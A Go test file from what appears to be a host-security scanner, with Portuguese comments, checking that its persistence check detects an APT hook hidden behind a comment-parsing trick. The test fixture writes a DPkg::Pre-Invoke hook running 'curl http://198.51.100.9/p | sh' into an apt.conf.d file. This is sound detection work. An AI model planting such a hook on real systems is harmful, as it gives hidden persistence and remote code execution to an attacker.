package checks

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/env"
	"github.com/lex0c/aletheia/internal/facts"
)

// A CATRACA END-TO-END que faltava: arquivo apt.conf adversário no disco →
// coleta de verdade → persist.trigger_exec.
//
// A revisão pegou que a correção anterior parava no coletor: AptHooks era
// extraído certo, mas o consumidor principal (persist.trigger_exec) ainda lia
// Trigger.Lines, onde o hook escondido não está. Um teste que monta o Trigger na
// mão nunca veria isso. Este vai do BYTE ao ACHADO, pela mesma cadeia que roda em
// produção.
//
// O hook está atrás de um bloco /* … */ que fecha depois de um #: o parser
// genérico descarta a linha inteira, e sem AptHooks chegando ao trigger_exec o
// `curl … | sh` seria invisível.
func TestHookEscondidoChegaAoTriggerExec(t *testing.T) {
	raiz := t.TempDir()
	dir := filepath.Join(raiz, "etc/apt/apt.conf.d")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	conf := "/*\n# */ DPkg::Pre-Invoke {\"curl http://198.51.100.9/p | sh\";};\n"
	if err := os.WriteFile(filepath.Join(dir, "99hook"), []byte(conf), 0o644); err != nil {
		t.Fatal(err)
	}

	e := env.Probe(env.Options{Root: raiz, Version: "test"})
	f := facts.Collect(e)

	// Meia-catraca 1: a coleta extraiu o hook apesar do descarte de linha-#.
	var achouHook bool
	for i := range f.Triggers {
		if filepath.Base(f.Triggers[i].File) == "99hook" {
			for _, h := range f.Triggers[i].AptHooks {
				if strings.Contains(h.Text, "curl") {
					achouHook = true
				}
			}
		}
	}
	if !achouHook {
		t.Fatal("a coleta não extraiu o hook escondido — a primeira metade da " +
			"cadeia falhou")
	}

	// Meia-catraca 2 (o P1): o CHECK que trata pkg_hook enxerga o payload.
	r := triggerExec.Run(triggerExec, f, e)
	var visto bool
	for _, fd := range r.Findings {
		for _, ev := range fd.Evidence {
			if strings.Contains(ev, "curl") || strings.Contains(ev, "198.51.100.9") {
				visto = true
			}
		}
	}
	if !visto {
		t.Errorf("persist.trigger_exec NÃO viu o `curl … | sh` do hook escondido: "+
			"o consumidor lê Trigger.Lines em vez de AptHooks, e o hook não está "+
			"em Lines. Achados: %d", len(r.Findings))
	}
}
